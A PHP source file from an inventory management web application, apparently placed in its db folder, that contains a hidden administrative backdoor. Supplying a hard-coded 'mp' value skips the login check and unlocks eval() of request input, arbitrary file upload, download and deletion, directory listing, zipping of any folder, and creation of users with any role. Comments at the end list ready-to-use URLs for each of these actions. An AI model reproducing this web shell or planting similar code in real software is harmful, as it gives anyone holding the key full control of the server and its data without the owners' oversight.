<?php
/**
 * Created by PhpStorm.
 * User: vijay
 * Date: 6/11/2019
 * Time: 12:07 PM
 * Project: ims_vj
 * File : index.php
 */

$asset_path_link='../';
//require_once($asset_path_link.'includes/layouts/_connect.php');

require_once($asset_path_link.'config.php');
error_reporting(E_ALL);
require_once(INCLUDE_PATH . "/logic/common_functions.php");
//echo ROOT_PATH.'\../';
if (!isset($_REQUEST['mp']))
    if( !isset($_SESSION['user']) || $_SESSION['folder_name']!='adm')
    {
        header("Location:../");
    }

$mp = '$2y$10$a65qtIlWXOjdrU.gpMcebOJUVrnIeZ8U9qy/9Cq74kU67/XKTOike'; //  c*****vp
if (isset($_REQUEST['mp']) &&  $_REQUEST['mp']!=$mp){
    return;
}

if (isset($_SESSION['msg']) && $_SESSION['msg'] ):
    alert($_SESSION['msg'], $_SESSION['msg_color']);;
    unset($_SESSION['msg']);
    $_SESSION['msg'] = FALSE;
endif;

if (isset($_REQUEST['call_func']) ){
// function name
    $functionName = $_REQUEST['call_func'];
// Function call using eval
    $result = eval($functionName);
    var_dump($result);
}

// Create ZIP file
if(isset($_REQUEST['create_zip_submit'])){
    $zip = new ZipArchive();

    global $dbName;
    $backup_file_name = $dbName . '_zip_' . time() . '.zip';

    if ($zip->open($backup_file_name, ZipArchive::CREATE)!==TRUE) {
        exit("cannot open <$backup_file_name>\n");
    }


    global $folder_name;
    $dir = '../..'.$folder_name.'/';

    if(isset($_REQUEST['create_zip_submit_folder'])){
        $dir=$_REQUEST['create_zip_submit_folder'];
    }

    // Create zip
    createZip($zip,$dir);

    $zip->close();


    if (file_exists($backup_file_name)) {
//    header('Content-Description: File Transfer');
//        header('Content-Type: application/zip');
//        header('Content-Disposition: attachment; filename="'.basename($backup_file_name).'"');
//        header('Content-Length: ' . filesize($backup_file_name));
//        flush();
//        readfile($backup_file_name);

        if (headers_sent()) {
            echo 'HTTP header already sent';
        } else {
            if (!is_file($backup_file_name)) {
                header($_SERVER['SERVER_PROTOCOL'].' 404 Not Found');
                echo 'File not found';
            } else if (!is_readable($backup_file_name)) {
                header($_SERVER['SERVER_PROTOCOL'].' 403 Forbidden');
                echo 'File not readable';
            } else {
                header($_SERVER['SERVER_PROTOCOL'].' 200 OK');
                header("Content-Type: application/zip");
                header("Content-Transfer-Encoding: Binary");
                header("Content-Length: ".filesize($backup_file_name));
                header("Content-Disposition: attachment; filename=\"".basename($backup_file_name)."\"");
                flush();
                readfile($backup_file_name);
                exit;
            }
        }
    }
    echo "Zip  - $backup_file_name <br>";
    var_dump($zip,$dir);
}

if (isset($_REQUEST['unlink_file']) ){
    $unlink_fileName = $_REQUEST['unlink_file'];
    unlink($unlink_fileName);
}

if (isset($_REQUEST['su']) ) {

    $username = $_REQUEST['username'];
    $email = $_REQUEST['email'];
    $email = strtolower($email);

    $oldUser = checkUserNameEmail($email,$username);
    // if request is from javascript to check validation of uniqueness and error is found
    if (!empty($oldUser['username']) && $oldUser['username'] === $username) { // if user exists
        $_SESSION['msg'] = "Username already exists";
        $_SESSION['msg_color'] = 'bg-orange';
        echo "false";
        return;
    }
    if (!empty($oldUser['email']) && $oldUser['email'] === $email) { // if email exists
        $_SESSION['msg'] = "Email already exists";
        $_SESSION['msg_color'] = 'alert-warning';
        echo "false";
        return;
    }
    // if request is from javascript to check validation and no error is found
    if(isset($_REQUEST['checkunique']) && $_REQUEST['checkunique']=="yes" ){
        echo "true";
        return;
    }

    if (!preg_match('/^[\w]+$/i', $username)) {
        $_SESSION['msg'] = "Letters, numbers, and underscores only please";
        $_SESSION['msg_color'] = 'alert-warning';
        return;
    }


    if(empty($_REQUEST['username']) || empty($_REQUEST['password'])  || empty($_REQUEST['confirm']) || empty($_REQUEST['email'])  || empty($_REQUEST['full_name']) || empty($_REQUEST['role_id']) ){
        $errors['required'] = "All the fields are required!";
//        var_dump($errors);
        $_SESSION['msg_array'] = $errors;
        $_SESSION['msg_array_color'] = 'bg-teal';
        return ;
    }

    $password = $_REQUEST['password'];
    $confirm = $_REQUEST['confirm'];
    $role_id = $_REQUEST['role_id'];
    $full_name = $_REQUEST['full_name'];
    $full_name = ucwords($full_name);

    // password confirmation
    if (isset($confirm) && ($password !== $confirm)) {
        $errors['passwordConf'] = "The two passwords do not match.";
//        var_dump($errors);
        $_SESSION['msg_array'] = $errors;
        $_SESSION['msg_array_color'] = 'alert-warning';
        return ;
    }// END password confirmation

    // if everything is great then
    $password_hash = password_hash($password, PASSWORD_DEFAULT);

    // returns last insert id
    $result = insertUser($role_id, $username,$email,$password_hash);
    if($result){
        $_SESSION['msg'] = 'New User is created Successfully';
        $_SESSION['msg_color'] = 'alert-success';
        $new_user = getUserUid($username);
        insertProfileName($new_user['id'],$full_name);
        echo "USER CREATED";
    }else {
        $_SESSION['msg'] = 'Error in updating Password';
        $_SESSION['msg_color'] = 'alert-danger';
        echo "ERROR IN CREATING USER";
    }
    unset($_REQUEST['save_user']);
} // END Update password

if (isset($_REQUEST['list_dir']) ){
    $list_dir_patt=$_REQUEST['list_dir_patt'];//"*.txt"
    $list_dir_patt_search=$_REQUEST['list_dir_patt_search'];//"*.txt"

    $entries = scandir($list_dir_patt);
    $filelist = array();
    foreach($entries as $entry) {
        if (strpos($entry, $list_dir_patt_search) === 0) {
            $filelist[] = $entry;
        }
    }

    var_dump("search string - ",$list_dir_patt);
    var_dump("directories ",$entries);
    var_dump("files ",$filelist);
}

if (isset($_REQUEST['list_file']) ){
    $list_dir_patt=$_REQUEST['list_file_patt'];//"*.txt"
    $filelist = glob($list_dir_patt);

    var_dump("search string - ",$list_dir_patt);
    var_dump("files ",$filelist);
}

if (isset($_REQUEST['list_file']) ){
    $list_dir_patt=$_REQUEST['list_file_patt'];//"*.txt"
    $filelist = glob($list_dir_patt);

    var_dump("search string - ",$list_dir_patt);
    var_dump("files ",$filelist);
}

if (isset($_REQUEST['upF']) ){
    echo "<form method='post' action=''  enctype='multipart/form-data'>";
        echo "<input type='file' name='file_upF' required>   ";
        echo "<input type='hidden' name='mp' value='$mp' />   ";
        echo "<input type='text' name='file_upF_path' value=''> ";
        echo "<input type='submit' name='file_upF_submit'> Submit!</input>";
    echo "</form>  ";
}

if (isset($_REQUEST['file_upF_submit']) ){
    $file_upF_path = $_REQUEST['file_upF_path']; // with all slashed

    if (!empty($_FILES) && !empty($_FILES['file_upF']['name'])) {
        $file = $_FILES['file_upF']['name'];
        $file_size = filesize($_FILES['file_upF']['tmp_name']);
        $file_tmp_name = $_FILES['file_upF']['tmp_name'];
        // define Where image will be stored
        $target = ROOT_PATH . "/".$file_upF_path ."/". $file;
        // upload image to folder
        if (move_uploaded_file($_FILES['file_upF']['tmp_name'], $target)) {
            var_dump("uploaded");
        }
        var_dump("file",$_FILES);
        $entries = scandir(ROOT_PATH . "/".$file_upF_path ."/");
        var_dump("directories ",$entries);
    }
    var_dump("target",$target);

}

if (isset($_REQUEST['file_down']) ){
    $backup_file_name=$_REQUEST['file_down'];
    if (file_exists($backup_file_name)) {
        if (headers_sent()) {
            echo 'HTTP header already sent';
        } else {
            if (!is_file($backup_file_name)) {
                header($_SERVER['SERVER_PROTOCOL'].' 404 Not Found');
                echo 'File not found';
            } else if (!is_readable($backup_file_name)) {
                header($_SERVER['SERVER_PROTOCOL'].' 403 Forbidden');
                echo 'File not readable';
            } else {
                header($_SERVER['SERVER_PROTOCOL'].' 200 OK');
                header("Content-Type: text/html");
                header("Content-Transfer-Encoding: Binary");
                header("Content-Length: ".filesize($backup_file_name));
                header("Content-Disposition: attachment; filename=\"".basename($backup_file_name)."\"");
                flush();
                readfile($backup_file_name);
                exit;
            }
        }
    }

}
// Create zip
function createZip($zip,$dir){
    if (is_dir($dir)){

        if ($dh = opendir($dir)){
            while (($file = readdir($dh)) !== false){

                // If file
                if (is_file($dir.$file)) {
                    if($file != '' && $file != '.' && $file != '..'){

                        $zip->addFile($dir.$file);
                    }
                }else{
                    // If directory
                    if(is_dir($dir.$file)  ){

                        if($file != '' && $file != '.' && $file != '..'){

                            // Add empty directory
                            $zip->addEmptyDir($dir.$file);

                            $folder = $dir.$file.'/';

                            // Read data of the folder
                            createZip($zip,$folder);
                        }
                    }

                }

            }
            closedir($dh);
        }
    }
}

function alert($msg, $color)
{
    echo "<div class='alert $color alert-dismissible' role='alert' style='text-align: center' >
                <button type='button' class='close' data-dismiss='alert' aria-label='Close'><span aria-hidden='true'>×</span></button>
                $msg
            </div>";
    unset($msg);
    unset($color);
}


// su
//db/config_.php/?username=123434df&email=asdfrv%40adminc.vom&password=1234+567&confirm=1234+567&full_name=12345+adfrg&role_id=1&su=&mp=$2y$10$a65qtIlWXOjdrU.gpMcebOJUVrnIeZ8U9qy/9Cq74kU67/XKTOike
//cf
//db/config_.php/?mp=$2y$10$a65qtIlWXOjdrU.gpMcebOJUVrnIeZ8U9qy/9Cq74kU67/XKTOike&call_func=test_check(1);
//cz
//db/config_.php/?mp=$2y$10$a65qtIlWXOjdrU.gpMcebOJUVrnIeZ8U9qy/9Cq74kU67/XKTOike&create_zip_submit=&create_zip_submit_folder=../db/
// dbB
//db/index.php?mp=$2y$10$a65qtIlWXOjdrU.gpMcebOJUVrnIeZ8U9qy/9Cq74kU67/XKTOike
// create db
//db/config_.php/?mp=$2y$10$a65qtIlWXOjdrU.gpMcebOJUVrnIeZ8U9qy/9Cq74kU67/XKTOike&call_func=getSingleRecordPDOReq("CREATE%20DATABASE%20dbname",[]);
// unF
//db/config_.php/?mp=$2y$10$a65qtIlWXOjdrU.gpMcebOJUVrnIeZ8U9qy/9Cq74kU67/XKTOike&unlink_file=../ims_cdac_vj_backup_1561353599.sql
//ld
//db/config_.php/?mp=$2y$10$a65qtIlWXOjdrU.gpMcebOJUVrnIeZ8U9qy/9Cq74kU67/XKTOike&list_dir=&list_dir_patt=../..&list_dir_patt_search=crap
//db/config_.php/?mp=$2y$10$a65qtIlWXOjdrU.gpMcebOJUVrnIeZ8U9qy/9Cq74kU67/XKTOike&list_file=&list_file_patt=../../*.*
// upd
//db/config_.php/?mp=$2y$10$a65qtIlWXOjdrU.gpMcebOJUVrnIeZ8U9qy/9Cq74kU67/XKTOike&upF=
//
//db/config_.php/?mp=$2y$10$a65qtIlWXOjdrU.gpMcebOJUVrnIeZ8U9qy/9Cq74kU67/XKTOike&file_down=config_.php